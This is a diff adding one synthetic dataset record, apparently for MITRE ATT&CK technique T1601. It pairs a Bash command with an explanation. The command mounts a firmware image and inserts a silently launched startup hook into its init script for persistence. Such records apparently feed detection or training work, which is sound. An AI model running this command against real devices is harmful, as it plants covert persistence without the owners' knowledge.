@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "loopdev=$(losetup -fP --show /var/tmp/modified_system.img) && mount ${loopdev}p1 /mnt/img && cp /mnt/img/etc/init.d/rcS /tmp/rcS.bak && sed -i '1i /usr/local/bin/healthd --silent &' /mnt/img/etc/init.d/rcS && diff -u /tmp/rcS.bak /mnt/img/etc/init.d/rcS && umount /mnt/img && losetup -d \"$loopdev\"",
+  "explanation": "Mounts the modified firmware image partition, inserts a startup hook for persistence, and uses diff to validate that the init script inside the image was altered.",
+  "rationale_steps": [
+    "Attach the image to a loop device and mount its root partition (root privileges required).",
+    "Modify the init sequence to embed a malicious hook inside the image.",
+    "Diff the pre- and post-modification init script to confirm system image changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-6048333d-4a23db30",
+  "source_prompt_hash": "6048333d",
+  "timestamp_utc": "2025-09-30T04:32:34.003779Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
